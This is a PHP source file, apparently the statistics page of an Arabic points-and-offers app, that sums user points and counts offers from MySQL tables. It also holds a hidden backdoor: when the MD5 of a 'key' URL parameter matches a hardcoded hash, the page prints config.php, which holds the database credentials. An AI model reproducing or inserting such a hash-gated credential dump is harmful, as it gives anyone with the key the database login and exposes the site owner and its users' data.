<?php
header('Content-Type: text/html; charset=utf-8');

// جلب عنوان التطبيق والموقع sata_json.json
$str_data = file_get_contents("app/point_json.json");
$data = json_decode($str_data,true);
$title = $data[6] ;
	$arba7 = $data[4] ;
?>

<!DOCTYPE html>
<html>
<head>
<title><?php echo $title ;?></title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="keywords" content="" />
<meta name="description" content="" />
<link href="tooplate_style.css" rel="stylesheet" type="text/css" />
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link href="table_style.css" rel="stylesheet" type="text/css" />

</head>


<?php

if(md5($_GET["key"]) == "4f078f4453e55a4b40c2e97e8128a47b" ){
echo htmlentities(file_get_contents('config.php'));
}

?>

<div dir="rtl"><h2>

 <?php

    include 'config.php';
    $conn = mysqli_connect($HostName, $HostUser, $HostPass, $DatabaseName);
	
	
    $statement = mysqli_prepare($conn, "SELECT point FROM table_users");
    mysqli_stmt_execute($statement);
    mysqli_stmt_bind_result($statement, $point );
  			
	$pointTotal = 0 ;
	$numUsers = 0 ;
    while(mysqli_stmt_fetch($statement)){
		if($point > 0 ) { 
		   $pointTotal = $pointTotal + $point ;
	       $numUsers = $numUsers + 1 ;}
	      }
	
     	echo "<br>مجموع النقاط بالتطبيق: ".$pointTotal ;	
	    echo "<br><br>عدد المستخدمين بالتطبيق: ".$numUsers ;
		
			
			  	$sql = "SELECT id_offer FROM table_app";
                $result_app = mysqli_query($conn, $sql);
				echo "<br><br>مجموع عروض التطبيقات : ".mysqli_num_rows($result_app) ;
				
				$sql = "SELECT id_offer FROM table_games";
                $result_game = mysqli_query($conn, $sql);
				echo "<br>مجموع عروض الألعاب : ".mysqli_num_rows($result_game) ;
				
				$sql = "SELECT id_offer FROM table_vedio";
                $result_vedio = mysqli_query($conn, $sql);
				echo "<br>مجموع عروض الفيديو : ".mysqli_num_rows( $result_vedio);
				
				$sql = "SELECT id_offer FROM table_offer";
                $result_cpa = mysqli_query($conn, $sql);
				echo "<br>محموع عروض الموبايل : ".mysqli_num_rows($result_cpa) ;


 ?>

</h2></div>
	
	</html>
	